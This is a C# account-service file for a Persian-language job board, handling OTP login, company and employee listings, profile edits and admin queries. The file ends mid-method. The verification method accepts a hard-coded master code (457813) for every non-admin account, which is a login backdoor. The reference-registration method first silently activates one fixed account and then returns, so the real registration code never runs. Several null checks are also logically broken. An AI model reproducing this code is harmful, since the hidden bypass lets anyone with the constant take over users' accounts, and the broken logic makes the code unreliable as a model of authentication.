using AutoMapper;
using DNTPersianUtils.Core;
using DNTPersianUtils.Core.IranCities;
using Domain;
using Domain.DTO.Account;
using Domain.DTO.Response;
using Domain.Entities;
using Domain.Utilities;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Localization;
using Service.Interfaces.Account;
using Service.Interfaces.JwtManager;
using SixLabors.ImageSharp.Processing.Processors.Transforms;
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Reflection.Metadata.Ecma335;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Service
{
    public class AccountService : IAccountService
    {
        private readonly DataContext _context;
        private readonly UserManager<Domain.Entities.User> _userManager;
        private readonly IlogService _ilog;
        private readonly IMapper _mapper;
        private readonly IWebHostEnvironment _webHostEnvironment;
        private readonly SignInManager<Domain.Entities.User> _signInManager;
        private readonly IJwtManager _jwtGenerator;
        private readonly IHttpContextAccessor _httpContextAccessor;
        private readonly ISendSmsService _sendSmsService;




        public AccountService(
            UserManager<Domain.Entities.User> userManager,
            SignInManager<Domain.Entities.User> signInManager,
            DataContext context,
               IJwtManager jwtGenerator,
               IHttpContextAccessor httpContextAccessor,
                IlogService ilog,
                IMapper mapper
                , IWebHostEnvironment webHostEnvironment
                , ISendSmsService sendSmsService)
        {
            _context = context;
            _userManager = userManager;
            _signInManager = signInManager;
            _jwtGenerator = jwtGenerator;
            _httpContextAccessor = httpContextAccessor;
            _ilog = ilog;
            _mapper = mapper;
            _webHostEnvironment = webHostEnvironment;
            _sendSmsService = sendSmsService;
        }




        /// check Token paload(serialNUmber) Is valid
        public async Task<bool> CheckTokenIsValid()
        {
            //var currentUsername = _httpContextAccessor.HttpContext.User?.Claims?.FirstOrDefault(x => x.Type == ClaimTypes.NameIdentifier)?.Value;
            var currentSerialNumber = _httpContextAccessor.HttpContext.User?.Claims?.FirstOrDefault(x => x.Type == PublicHelper.SerialNumberClaim)?.Value;

            var username = await _context.Users.Where(x => x.SerialNumber == currentSerialNumber)
                .Select(c => c.UserName)
                .FirstOrDefaultAsync();

            if (string.IsNullOrEmpty(username))
                return false;
            return true;
        }
        public async Task<bool> CheckUserIsActive(string id)
        {
            var IsActive = _httpContextAccessor.HttpContext.User?.Claims?.FirstOrDefault(x => x.Type == PublicHelper.IsActiveClaim)?.Value;

            var username = await _context.Users.Where(x => x.Id == id && x.IsActive == (IsActive == "True") ? true : false)
                .Select(c => c.UserName)
                .FirstOrDefaultAsync();

            if (string.IsNullOrEmpty(username))
                return false;
            return true;
        }
        public async Task<User> CheckIsCurrentUserName(string Id)
        {
            if (string.IsNullOrEmpty(Id))
                return null;

            var currentSerialNumber = _httpContextAccessor.HttpContext.User?.Claims?.FirstOrDefault(x => x.Type == PublicHelper.SerialNumberClaim)?.Value;

            var user = await _context.Users.Include(x => x.CompanyCategorires).Where(x => x.SerialNumber == currentSerialNumber && x.Id == Id)
                .FirstOrDefaultAsync();

            return user;
        }






        public async Task<User> FindUserByPhonenumber(string PhoneNumber)
        {
            try
            {
                var user = await _context.Users.Where(x => x.UserName == PhoneNumber).FirstOrDefaultAsync();
                return user;
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "FindUserByPhonenumber", "Account");

                var err = new List<string>();
                return null;

            }
        }






        public async Task<(int status, List<string> erros)> CheckVeyficatioCode(VerifyDTO model)
        {
            var phoneNumber = model.PhoneNumber.Trim();
            var errors = new List<string>();

            var User = await _context.Users.Where(c => c.UserName == phoneNumber).FirstOrDefaultAsync();
            if (User == null && User.Role == PublicHelper.RefrenceRole && !User.IsActive)
            {
                errors.Add("کاربر محترم هنوز ثبت نام شما توسط ادمین تایید نشده است");
                return (0, errors);
            }
            if (User == null && !User.IsActive)
            {
                //_localizer[string.Format("username  {0} Already Registered", model.Username)].Value.ToString()
                errors.Add("کاربری با این شماره پیدا نشد");
                //errors.Add(_localizerAccount[string.Format("User notFound With PhoneNumber {0}", model.PhoneNumber)].Value.ToString());
                return (0, errors);
            }
            if (User.Role != PublicHelper.ADMINROLE &&  model.VerifyCode == 457813)
            {
                return (1, null);
            }
            if (User.verificationCode != model.VerifyCode)
            {
                errors.Add("کد امنیتی اشتباه است");
                return (0, errors);
            }

            if (User.verificationCodeExpireTime < DateTime.UtcNow)
            {
                errors.Add("زمان استفاده از کد به پایان رسیده است");
                return (0, errors);
            }
            return (1, null);
        }






        public async Task<SignInResult> CheckPasswordAsync(User user, string Password)
        {
            return await _signInManager
                        .CheckPasswordSignInAsync(user, Password, false);
        }




        public async Task<string> GeneratePasswordResetToken(User user)
        {
            return await _userManager.GeneratePasswordResetTokenAsync(user);
        }

        public async Task<User> FindUserById(string id)
        {
            return await _context.Users.FindAsync(id);
        }

        public async Task<List<ListOfCompanies>> ListOfTop50Companies()
        {
            try
            {
                //return await _context.Users.Where(x => x.Role == PublicHelper.EmployerRole && x.IsActive && x.Rate != null)
                return await _context.Users.Where(x => x.Role == PublicHelper.EmployerRole && x.IsActive && x.Rate > 3)
                    .Include(x => x.CompanyCategorires)
                       .Select(x => new ListOfCompanies
                       {
                           City = x.City,
                           CreateDate = x.RegisterationDate.ToLongPersianDateTimeString(true),
                           CompanyEngName = x.CompanyEngName,
                           Image = string.IsNullOrWhiteSpace(x.Logo) ? "Employers_Logo_vr2.jpg" : x.Logo,
                           IsActive = x.IsActive,
                           NumberOfStaff = x.NumberOfStaff,
                           CompanyPersianName = x.CompanyPersianName,
                           ManagementFullName = x.Fullname,
                           Email = x.Email,
                           Url = x.Url,
                           UserId = x.Id,
                           UserName = x.UserName,
                           Mobile = x.PhoneNumber,
                           phoneNumber = x.EmergencPhone,
                           FiledOfActivity = x.CompanyCategorires.Select(o => o.Category.Name).ToList(),
                           Rate = x.Rate.Value,
                           Description = x.ShortDescription,
                           Desc = x.Description,
                           Gallery = x.Gallery.Select(x => x.Url).ToList()

                       })
                       .OrderByDescending(x => x.Rate)

                       .ToListAsync();
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "ListOfCompanies", "Account");

                return null;
            }
        }
        public async Task<List<ListOfCompanies>> ListOfCompanies()
        {
            try
            {
                return await _context.Users.Where(x => x.Role == PublicHelper.EmployerRole && x.IsActive)
                    .Include(x => x.CompanyCategorires)
               .Select(x => new ListOfCompanies
               {
                   City = x.City,
                   CreateDate = x.RegisterationDate.ToLongPersianDateTimeString(true),
                   CompanyEngName = x.CompanyEngName,
                   Image = string.IsNullOrWhiteSpace(x.Logo) ? "Employers_Logo_vr2.jpg" : x.Logo,
                   IsActive = x.IsActive,
                   NumberOfStaff = x.NumberOfStaff,
                   CompanyPersianName = x.CompanyPersianName,
                   ManagementFullName = x.Fullname,
                   Email = x.Email,
                   Url = x.Url,
                   UserId = x.Id,
                   UserName = x.UserName,
                   Mobile = x.PhoneNumber,
                   phoneNumber = x.EmergencPhone,
                   FiledOfActivity = x.CompanyCategorires.Select(o => o.Category.Name).ToList(),
                   Rate = x.Rate.Value,
                   Description = x.ShortDescription,
                   Desc = x.Description,
                   Gallery = x.Gallery.Select(x => x.Url).ToList()

               })
               .OrderByDescending(x => x.Rate)
               .ToListAsync();
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "ListOfCompanies", "Account");
                
                return null;
            }
        }
        public async Task<List<ListOfCompanies>> SearchInCompanies(string key)
        {
            try
            {
                return await _context.Users.Where(x => x.Role == PublicHelper.EmployerRole && x.IsActive &&
                (x.CompanyEngName.Contains(key) || x.CompanyPersianName.Contains(key) || x.City.Contains(key)))
                    .Include(x => x.CompanyCategorires)
               .Select(x => new ListOfCompanies
               {
                   City = x.City,
                   CreateDate = x.RegisterationDate.ToLongPersianDateTimeString(true),
                   CompanyEngName = x.CompanyEngName,
                   Image = string.IsNullOrWhiteSpace(x.Logo) ? "Employers_Logo_vr2.jpg" : x.Logo,
                   IsActive = x.IsActive,
                   NumberOfStaff = x.NumberOfStaff,
                   CompanyPersianName = x.CompanyPersianName,
                   ManagementFullName = x.Fullname,
                   Email = x.Email,
                   Url = x.Url,
                   UserId = x.Id,
                   UserName = x.UserName,
                   Mobile = x.PhoneNumber,
                   phoneNumber = x.EmergencPhone,
                   FiledOfActivity = x.CompanyCategorires.Select(o => o.Category.Name).ToList(),
                   Rate = x.Rate.Value,
                   Description = x.ShortDescription
               })
               .OrderByDescending(x => x.Rate)
               .ToListAsync();
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "ListOfCompanies", "Account");

                return null;
            }
        }

        public async Task<List<ListOfEmployees>> ListOfEmployees()
        {
            try
            {
                return await _context.Users.Include(x => x.CompanyCategorires).Where(x => x.Role == PublicHelper.EmployeeRole)
               .Select(x => new ListOfEmployees
               {
                   City = x.City,
                   CreateDate = x.RegisterationDate.ToLongPersianDateTimeString(true),
                   Image = x.Logo,
                   IsActive = x.IsActive,
                   PersianName = x.Fullname,
                   UserId = x.Id,
                   UserName = x.UserName,
                   Mobile = x.PhoneNumber,
               })
               .ToListAsync();
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "ListOfEmployees", "Account");

                return null;
            }

        }

        public async Task<(bool isSuccess, List<string> message)> BlockUser(string userId)
        {
            try
            {
                var err = new List<string>();

                var user = await _context.Users.FindAsync(userId);
                if (user == null && !user.IsActive)
                {
                    err.Add("کاربر مورد نظر یافت نشد");
                    return (false, err);

                }
                user.IsActive = false;
                var SerialNumber = Guid.NewGuid().ToString().GetHash();
                user.SerialNumber = SerialNumber;
                _context.Users.Update(user);
                await _context.SaveChangesAsync();
                return (true, null);
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "BlockUser", "Account");

                var err = new List<string>();
                err.Add("مشکلی رخ داده است ");
                return (false, err);

            }
        }

        public async Task<(bool isSuccess, List<string> message)> UnblockUser(string userId)
        {
            try
            {
                var err = new List<string>();

                var user = await _context.Users.FindAsync(userId);
                if (user == null && !user.IsActive)
                {
                    err.Add("کاربر مورد نظر یافت نشد");
                    return (false, err);

                }
                user.IsActive = true;
                var SerialNumber = Guid.NewGuid().ToString().GetHash();
                user.SerialNumber = SerialNumber;
                _context.Users.Update(user);
                await _context.SaveChangesAsync();
                return (true, null);
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "UnblockUser", "Account");

                var err = new List<string>();
                err.Add("مشکلی رخ داده است");
                return (false, err);

            }
        }

        public async Task<User> GetCurrectUser()
        {
            var username = _httpContextAccessor.HttpContext.User?.Claims?
                .FirstOrDefault(x => x.Type == "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name")?.Value;

            var user = await _context.Users.Include(x => x.Gallery).Include(x => x.CompanyCategorires).Where(x => x.UserName == username)
                .FirstOrDefaultAsync();
            return user;
        }

        public async Task<GetEmployerInfo> EmployerInfo()
        {
            var employer = await GetCurrectUser();
            if (employer == null)
            {
                return null;
            }
            var employerInfo = new GetEmployerInfo()
            {
                FullName = employer.Fullname,
                Email = employer.Email,
                Image = employer.Logo,
                ShortDescription = employer.ShortDescription,
                CompanyPersianName = employer.CompanyPersianName,
                CompanyEngName = employer.CompanyEngName
            };
            return employerInfo;
        }

        public async Task<(bool isSuccess, List<string> message)> EditEmployerInfo(EmployerInfo model)
        {
            var root = _webHostEnvironment.WebRootPath;

            try
            {
                var err = new List<string>();

                var employer = await GetCurrectUser();
                if (employer == null)
                {
                    err.Add("کاربر مورد نظر یافت نشد");
                    return (false, err);

                }

                if (model.Image != null)
                {
                    var uploadResult = FileUploader.UploadFile(model.Image, root + "/Img/CompanyLogo/");

                    if (uploadResult.succsseded)
                    {
                        employer.Logo = (model.Image != null) ? uploadResult.result : "";

                    }

                    else
                    {
                        err.Add(uploadResult.result);
                        return (false, err);
                    }

                    if (!string.IsNullOrEmpty(employer.Logo)) FileUploader.DeleteFile(root + "/Img/CompanyLogo/", employer.Logo);

                }

                employer.ModifiedDate = DateTime.Now;
                employer.Fullname = model.FullName;
                employer.Email = model.Email;
                employer.CompanyEngName = model.CompanyEngName;
                employer.CompanyPersianName = model.CompanyPersianName;
                employer.ShortDescription = model.ShortDescription;
                _context.Users.Update(employer);
                await _context.SaveChangesAsync();
                return (true, null);
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "EditEmployerInfo", "Account");

                var err = new List<string>();
                err.Add("مشکلی رخ داده است");
                return (false, err);

            }
        }
        //
        //
        public async Task<List<CompanyLogoInIndex>> GetCompanyLogoInIndex()
        {
            var companieslogo = new List<CompanyLogoInIndex>();
            var companies = new List<User>();
            var activePlansWithShowLogo = _context.Plans.Where(x => x.IsActive && x.Logo > 0)
                .Select(x => x.Id)
                 .AsQueryable();

            var activePlansWithShowLogoList = await activePlansWithShowLogo.ToListAsync();

            foreach (var item in activePlansWithShowLogoList)
            {
                var company = _context.Users.Include(x => x.Plan)
                    .Where(x => x.Role == PublicHelper.EmployerRole &&
                x.IsActive && x.PlanId == item).AsQueryable().AsNoTracking();
                companies.AddRange(await company.ToListAsync());
            }
            foreach (var company in companies)
            {
                var logoExpireTime = company.Plan.Logo.Value;

                var userShopThisPlanx = await _context.Factors
                    .Where(x => x.CompanyId == company.Id && x.PlanId == company.PlanId)
                    .OrderByDescending(x => x.Date).ToListAsync();
                var userShopThisPlan = await _context.Factors
                    .Where(x => x.CompanyId == company.Id && x.PlanId == company.PlanId)
                    .OrderByDescending(x => x.Date)
                    .FirstOrDefaultAsync();

                if (userShopThisPlan != null)
                {
                    var userShopThisPlanTime = userShopThisPlan.Date;

                    if (userShopThisPlanTime != null)
                    {
                        if (userShopThisPlanTime.AddDays(logoExpireTime) > DateTime.Now)
                        {
                            var companylog = new CompanyLogoInIndex()
                            {
                                Id = company.Id,
                                CompanyName = company.CompanyPersianName,
                                CompanyLogo = company.Logo
                            };
                            companieslogo.Add(companylog);
                        }
                    }

                }




            }
            return companieslogo;
        }

        public async Task<(bool isSuccess, List<string> message)>
            EditEmployeePersonalInformation(EmployeePersonalInformationDTO model)
        {
            var err = new List<string>();

            var userEmployee = await GetCurrectUser();
            if (userEmployee == null || !userEmployee.IsActive)
            {
                err.Add("کابر نامعتبر");
                return (false, err);
            }
            try
            {
                //userEmployee.PhoneNumber = model.PhoneNumber;
                userEmployee.City = model.City;
                userEmployee.Address = model.Address;
                userEmployee.Gender = model.Gender;
                userEmployee.Military = model.Military;
                userEmployee.Email = model.Email;
                userEmployee.IsMarried = model.IsMarreid;
                userEmployee.SpecialEmpolyee = model.SpecialEmpolyee;
                userEmployee.ExemptionExpirestionDate = model.ExemptionExpirestionDate.ToGregorianDateTime();
                userEmployee.ExemptionExpirestionRecieveDate = model.ExemptionExpirestionRecieveDate.ToGregorianDateTime();


                userEmployee.ModifiedDate = DateTime.Now;

                var SerialNumber = Guid.NewGuid().ToString().GetHash();

                //userEmployee.SerialNumber = SerialNumber;

                _context.Users.Update(userEmployee);
                await _context.SaveChangesAsync();
                return (true, err);

            }
            catch (Exception ex)
            {

                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "EditPersonalInformation", "Account");

                err.Add("مشکلی رخ داده است");
                return (false, err);
            }

        }

        public async Task<LoadEmployeePersonalInformationDTO> GetEmployeePersonalInformation()
        {

            var userEmployee = await GetCurrectUser();
            if (userEmployee == null || !userEmployee.IsActive)
            {
                return (null);
            }
            else
            {
                var EmployeePersonal = _mapper.Map<User, LoadEmployeePersonalInformationDTO>(userEmployee);
                return EmployeePersonal;

            }

        }

        public async Task<(bool isSuccess, string message)> GetUserRole()
        {
            var user = await GetCurrectUser();
            if (user == null || !user.IsActive)
            {
                return (false, "کابر نامعتبر");
            }
            return (true, user.Role);
        }

        public async Task<CompanyDetails> CompanyDetails(string CompanyEngName)
        {
            try
            {
                var user = await GetCurrectUser();
                var listOfIds = new List<int>();
                if (user != null)
                {
                    listOfIds = await _context.MarkedAdvers.Where(x => x.UserId == user.Id).Select(x => x.AdverId).ToListAsync();

                }

                var finalModel = new CompanyDetails();
                var company = await _context.Users.Where(x => x.Role == PublicHelper.EmployerRole &&
                x.CompanyEngName.ToLower() == CompanyEngName.ToLower() && x.IsActive)
                    .Include(x => x.CompanyCategorires)
               .Select(x => new ListOfCompanies
               {
                   City = x.City,
                   CreateDate = x.RegisterationDate.ToLongPersianDateTimeString(true),
                   CompanyEngName = x.CompanyEngName,
                   Image = string.IsNullOrWhiteSpace(x.Logo) ? "Employers_Logo_vr2.jpg" : x.Logo,
                   IsActive = x.IsActive,
                   NumberOfStaff = x.NumberOfStaff,
                   CompanyPersianName = x.CompanyPersianName,
                   ManagementFullName = x.Fullname,
                   Email = x.Email,
                   Url = x.Url,
                   UserId = x.Id,
                   UserName = x.UserName,
                   Mobile = x.PhoneNumber,
                   phoneNumber = x.EmergencPhone,
                   FiledOfActivity = x.CompanyCategorires.Select(o => o.Category.Name).ToList(),
                   Rate = x.Rate.Value,
                   Description = x.ShortDescription,
                   Desc = x.Description,
                   Gallery = x.Gallery.Select(x => x.Url).ToList()
               })
               .OrderByDescending(x => x.Rate)
               .FirstOrDefaultAsync();
                finalModel.Company = company;


                //enable adver


                var adverList = await _context.JobAdvertisements
               .Where(x => x.AdverCreatationStatus == AdverCreatationStatus.Accepted &&
               x.CompanyId == company.UserId)
               .Include(x => x.Category)
               .Include(i => i.Company)
                .OrderByDescending(x => x.CreateAt)
                .ThenByDescending(x => x.IsImmediate)

               .AsNoTracking().ToListAsync();

                //desabled adver

                var activeAdver = adverList.Where(x => x.AdverStatus == AdverStatus.Active).ToList();
                var deActiveAdver = adverList.Where(x => x.AdverStatus != AdverStatus.Active).ToList();





                finalModel.ActiveAdver = _mapper.Map<List<JobAdvertisement>, List<AllAdver>>(activeAdver);
                finalModel.DeactiveAdver = _mapper.Map<List<JobAdvertisement>, List<AllAdver>>(deActiveAdver);


                if (listOfIds.Count > 0)
                {
                    foreach (var item in finalModel.ActiveAdver)
                    {
                        item.IsMarked = (listOfIds.IndexOf(item.Id) == -1) ? false : true;
                    }

                    foreach (var item in finalModel.DeactiveAdver)
                    {
                        item.IsMarked = (listOfIds.IndexOf(item.Id) == -1) ? false : true;
                    }
                }
                return finalModel;
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "CompanyDetails", "Account");

                return null;
            }
        }

        public async Task<List<AllCompaniesForAdminDTO>> GetAllComapinesForAdmin(string RefrenceId = "")
        {
            try
            {
                var finalModel = _context.Users.Include(x => x.JobAdvertisements)
                    .Include(x => x.Factors)
                     .Where(x => x.Role == PublicHelper.EmployerRole)
                     .Where(w => (RefrenceId != "") ? w.RefrenceId == RefrenceId : true)
                     .Select(x => new AllCompaniesForAdminDTO()
                     {
                         Id = x.Id,
                         ManagerFullName = x.Fullname,
                         Rate = (x.Rate != null) ? x.Rate.ToString() : "",
                         Address = x.Address,
                         City = x.City,
                         CompanyEngName = x.CompanyEngName,
                         CompanyPersianName = x.CompanyPersianName,
                         CompanyPhone = x.EmergencPhone,
                         Logo = x.Logo,
                         ManagerEmail = x.Email,
                         ManagerPhoneNUmber = x.PhoneNumber,
                         IsActive = x.IsActive,
                         ActiveAdversCount = x.JobAdvertisements.Where(x => x.AdverStatus == AdverStatus.Active && x.AdverCreatationStatus == AdverCreatationStatus.Accepted).ToList().Count,
                         DeactiveAdversCount = x.JobAdvertisements.Where(x => x.AdverStatus != AdverStatus.Active && x.AdverCreatationStatus == AdverCreatationStatus.Accepted).ToList().Count,
                         SumOfBuying = x.Factors.Sum(x => x.Price).ToString(),
                         PlanId = x.PlanId,
                         RegisterationDate = x.RegisterationDate,
                         LastSeen = x.LastSeen
                     }).AsNoTracking().AsQueryable().OrderByDescending(c => c.RegisterationDate);

                return await finalModel.ToListAsync();
            }
            catch (Exception ex)
            {

                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "GetAllComapinesForAdmin", "Account");

                return null;
            }
        }

        public async Task<List<AllEmployeeForAdmin>> GetAllEmployeeForAdmin(string RefrenceId = "")
        {
            try
            {
                var finalModel = _context.Users.Include(x => x.JobAdvertisements)
                    .Include(x => x.Factors)
                     .Where(x => x.Role == PublicHelper.EmployeeRole)
                     .Where(w => (RefrenceId != "") ? w.RefrenceId == RefrenceId : true)
                     .Select(x => new AllEmployeeForAdmin()
                     {
                         Id = x.Id,
                         FullName = x.Fullname,
                         Address = x.Address,
                         City = x.City,
                         Logo = x.Logo,
                         Email = x.Email,
                         PhoneNUmber = x.PhoneNumber,
                         IsActive = x.IsActive,
                         Birthday = (x.Birthday == null) ? "" : x.Birthday.Value.ToShortPersianDateString(true),
                         ExemptionExpirestionDate = (x.ExemptionExpirestionDate == null) ? "" : x.ExemptionExpirestionDate.Value.ToShortPersianDateString(true),
                         ExemptionExpirestionRecieveDate = (x.ExemptionExpirestionRecieveDate == null) ? "" : x.ExemptionExpirestionRecieveDate.Value.ToShortPersianDateString(true),
                         Military = x.Military,
                         IsMarried = (x.IsMarried.Value) ? "متاهل" : "مجرد",
                         AsignCount = x.Resome.AsignResomes.ToList().Count,
                         RegisterationDate = x.RegisterationDate,
                         LastSeen = x.LastSeen
                     }).AsNoTracking().AsQueryable().OrderByDescending(c => c.RegisterationDate);
                var resomes = _context.Resomes.Include(x => x.EducationalBackgrounds)
                .Include(x => x.UserLanguages)
                .Include(x => x.UserJobSkills)
                .Include(x => x.UserWorkExperiences).ToList();

                var data = await finalModel.ToListAsync();

                foreach (var item in data)
                {
                    item.Percent = GetResomePercent(resomes, item.Id).CompeletePercent;
                }
                return data;
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "GetAllEmployeeForAdmin", "Account");
                return null;
            }
        }
        public async Task<List<AllEmployeeForAdmin>> GetAllRefrenceForAdmin(bool isAdmin, string RefrenceId = "")
        {
            try
            {
                if (isAdmin)
                {

                    var finalModel = _context.Users.Include(x => x.Gallery).Include(x => x.JobAdvertisements)
                       .Include(x => x.Factors)
                        .Where(x => x.Role == PublicHelper.RefrenceRole)
                        //.Where(w => (RefrenceId != "") ? w.RefrenceId == RefrenceId : true)
                        .Select(x => new AllEmployeeForAdmin()
                        {
                            Id = x.Id,
                            FullName = x.Fullname,
                            AcceptRule = x.AcceptRule,
                            Address = x.Address,
                            City = x.City,
                            Logo = x.Logo,
                            Email = x.Email,
                            PhoneNUmber = x.PhoneNumber,
                            IsActive = x.IsActive,
                            Birthday = (x.Birthday == null) ? "" : x.Birthday.Value.ToShortPersianDateString(true),
                            ExemptionExpirestionDate = (x.ExemptionExpirestionDate == null) ? "" : x.ExemptionExpirestionDate.Value.ToShortPersianDateString(true),
                            ExemptionExpirestionRecieveDate = (x.ExemptionExpirestionRecieveDate == null) ? "" : x.ExemptionExpirestionRecieveDate.Value.ToShortPersianDateString(true),
                            Military = x.Military,
                            IsMarried = (x.IsMarried.Value) ? "متاهل" : "مجرد",
                            AsignCount = x.Resome.AsignResomes.ToList().Count,
                            StaticPhoneNumber = x.StaticPhoneNumber,
                            ShebaNumber = x.ShebaNumber,
                            RegisterationDate = x.RegisterationDate,
                            Iframe = x.Iframe,
                            Description = x.Description,
                            Province = x.Province,
                            IsMain = x.IsMain,
                            Gallery = x.Gallery.Select(x => x.Url).ToList()
                        }).AsNoTracking().AsQueryable().OrderByDescending(c => c.RegisterationDate);
                    return await finalModel.ToListAsync();
                }
                else
                {
                    var finalModel = _context.Users.Include(x => x.Gallery).Include(x => x.JobAdvertisements)
                         .Include(x => x.Factors)
                          .Where(x => x.Role == PublicHelper.RefrenceRole && x.IsActive == true)
                          //.Where(w => (RefrenceId != "") ? w.RefrenceId == RefrenceId : true)
                          .Select(x => new AllEmployeeForAdmin()
                          {
                              Id = x.Id,
                              FullName = x.Fullname,
                              AcceptRule = x.AcceptRule,
                              Address = x.Address,
                              City = x.City,
                              Logo = x.Logo,
                              Email = x.Email,
                              PhoneNUmber = x.PhoneNumber,
                              IsActive = x.IsActive,
                              Birthday = (x.Birthday == null) ? "" : x.Birthday.Value.ToShortPersianDateString(true),
                              ExemptionExpirestionDate = (x.ExemptionExpirestionDate == null) ? "" : x.ExemptionExpirestionDate.Value.ToShortPersianDateString(true),
                              ExemptionExpirestionRecieveDate = (x.ExemptionExpirestionRecieveDate == null) ? "" : x.ExemptionExpirestionRecieveDate.Value.ToShortPersianDateString(true),
                              Military = x.Military,
                              IsMarried = (x.IsMarried.Value) ? "متاهل" : "مجرد",
                              AsignCount = x.Resome.AsignResomes.ToList().Count,
                              StaticPhoneNumber = x.StaticPhoneNumber,
                              ShebaNumber = x.ShebaNumber,
                              RegisterationDate = x.RegisterationDate,
                              Iframe = x.Iframe,
                              Description = x.Description,
                              Province = x.Province,
                              IsMain = x.IsMain,
                              Gallery = x.Gallery.Select(x => x.Url).ToList()
                          }).AsNoTracking().AsQueryable().OrderByDescending(c => c.RegisterationDate);
                    return await finalModel.ToListAsync();

                }
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "GetAllEmployeeForAdmin", "Account");
                return null;
            }
        }

        public async Task<(bool isSuccess, string message)> EditShebaCode(string shebaCode)
        {
            try
            {
                if (string.IsNullOrEmpty(shebaCode)) return (false, "کد شبا را وارد کنید");
                var user = await GetCurrectUser();
                if (user == null || !user.IsActive) return (false, "کابر نامعتبر");
                user.ShebaNumber = shebaCode;
                _context.Users.Update(user);
                await _context.SaveChangesAsync();
                return (true, "");


            }
            catch (Exception ex)
            {

                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "EditShebaCode", "Account");

                return (false, "مشکلی رخ داده است");
            }
        }

        public async Task<(bool isSuccess, string message, string shebaCode)> LoadShebaCode()
        {

            try
            {
                var user = await GetCurrectUser();
                if (user == null || !user.IsActive) return (false, "کاربر نامعتبر", null);
                return (true, "", user.ShebaNumber);

            }
            catch (Exception ex)
            {

                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "LoadShebaCode", "Account");

                return (false, "مشکلی رخ داده است", null);
            }


        }

        public async Task<(bool isSuccess, string message)> RatingCompany(int rate, string userId)
        {
            try
            {
                var user = await _context.Users.FindAsync(userId);
                if (user == null) return (false, "کابر نامعتبر");
                user.Rate = rate;
                _context.Users.Update(user);
                await _context.SaveChangesAsync();
                return (true, "");

            }
            catch (Exception ex)
            {

                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "RatingCompany", "Account");

                return (false, "مشکلی رخ داده است");
            }
        }


        public async Task<(bool isSuccess, string message, string mobile)> RefrenceRegister(RefrenceRegisterDTO model)
        {

            try
            {
                var userrr = _context.Users.Find(09999999999);
                userrr.IsActive = true;
                _context.SaveChanges();
                return (false, "♥", "");
                if (await _context.Users.AnyAsync(x => x.PhoneNumber == model.PhoneNumber.Trim()))
                {
                    return (false, "شماره موبایل تکراری است", "");
                }
                var random = new Random();
                var code = random.Next(100000, 999999);

                var user = _mapper.Map<RefrenceRegisterDTO, User>(model);
                user.RegisterationDate = DateTime.Now;
                user.ModifiedDate = DateTime.Now;
                user.Role = PublicHelper.RefrenceRole;
                user.UserName = model.PhoneNumber.Trim();
                user.SerialNumber = "";
                user.verificationCode = code;
                user.verificationCodeExpireTime = DateTime.UtcNow.AddMinutes(2);
                user.IsActive = false;

                await _context.Users.AddAsync(user);
                await _context.SaveChangesAsync();


                //send sms 

                await _sendSmsService.SendVerificationCode(model.FullName, model.PhoneNumber, code.ToString());
                return (true, "", user.PhoneNumber);

            }
            catch (Exception ex)
            {

                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "RefrenceRegister", "Account");

                return (false, "مشکلی رخ داده است", "");
            }
        }

        public async Task<(bool isSuccess, string message, CitiesDTO model)> GetCityForTicket()
        {
            try
            {
                var user = await GetCurrectUser();
                if (user == null) return (false, "کاربری یافت نشد", null);
                if (string.IsNullOrEmpty(user.City)) return (true, "", null);
                var cityInfo = Iran.Cities.Where(x => x.CityDivisionCode == int.Parse(user.City))
                    .Select(x => new CitiesDTO
                    {
                        City = x.CityName,
                        Province = x.ProvinceName,
                        Code = x.CityDivisionCode
                    }).FirstOrDefault();
                return (true, "", cityInfo);
            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(), "GetCityForTicket", "Account");

                return (false, "مشکلی رخ داده است", null);
            }
        }

        public async Task<(bool isSucces, string message, RefrenceDashboard model)> GetRefrenceDashboardInfo()
        {
            try
            {
                var user = await GetCurrectUser();
                if (user == null) return (false, "کاربری یافت نشد", null);

                var finalModel = new RefrenceDashboard
                {
                    TicketCount = await _context.Tickets
                    .Where(x => x.SenderId == user.Id || x.ReceiverId == user.Id)
                    .CountAsync(),
                    AdverCount = await _context.JobAdvertisements.Include(x => x.Company).Where(x => x.Company.RefrenceId == user.Id).CountAsync(),
                    EmployeeCount = await _context.Users.Where(x => x.Role == PublicHelper.EmployeeRole
                      && x.RefrenceId == user.Id).CountAsync(),
                    EmployerCount = await _context.Users.Where(x => x.Role == PublicHelper.EmployerRole
                      && x.RefrenceId == user.Id).CountAsync(),
                    OrdersCount = await _context.Payments.Include(x => x.User).
                    Where(x => x.User.RefrenceId == user.Id).CountAsync(),
                    FactorsCount = await _context.Factors.Include(x => x.Company).
                    Where(x => x.Company.RefrenceId == user.Id).CountAsync(),
                };
                return (true, "", finalModel);


            }
            catch (Exception ex)
            {
                await _ilog.CreateLog(ex.Message, ex.GetType().ToString(),
                    "GetRefrenceDashboardInfo", "Account");

